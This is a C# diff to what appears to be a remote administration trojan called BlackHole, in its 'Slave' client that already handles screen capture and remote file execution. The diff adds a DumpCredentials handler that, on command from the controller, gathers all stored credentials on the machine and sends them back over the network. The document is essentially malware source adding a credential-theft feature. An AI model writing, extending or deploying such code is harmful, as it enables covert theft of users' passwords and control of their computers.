@@ -3,6 +3,7 @@ using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
+using System.Threading.Tasks;
 using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
 using BlackHole.Slave.Helper;
@@ -154,6 +155,7 @@ namespace BlackHole.Slave
                 .With<StartScreenCaptureMessage>(ScreenCapture.Instance.StartScreenCapture)
                 .With<StopScreenCaptureMessage>(ScreenCapture.Instance.StopScreenCapture)
                 .With<ExecuteFileMessage>(ExecuteFile)
+                .With<StartCredentialsMessage>(DumpCredentials)
                 .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));
 
 #if DEBUG
@@ -161,7 +163,6 @@ namespace BlackHole.Slave
                 Console.WriteLine(message.GetType().Name);
 #endif
         }
-
 
         /// <summary>
         /// 
@@ -415,6 +416,33 @@ namespace BlackHole.Slave
                     CreateNoWindow, IntPtr.Zero, directory, ref si, out pi);
 
             }, message.FilePath);
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
+        private void DumpCredentials(StartCredentialsMessage message)
+        {
+            SendStatus(message.WindowId, "Credentials", "Started");
+
+            Task.Factory.StartNew(() =>
+            {
+                try
+                {
+                    var credentialsMessage = new CredentialsMessage(
+                        LibCredentials.LibCredentials.GetAllCredentialsAsDictionaries());
+
+                    ExecuteComplexSendOperation(message.WindowId,
+                        "Credentials",
+                        () => credentialsMessage);
+                }
+                catch
+                {
+                    // cancelled
+                    SendStatus(message.WindowId, "Credentials", "Ended");
+                }
+            });
         }
 
         /// <summary>
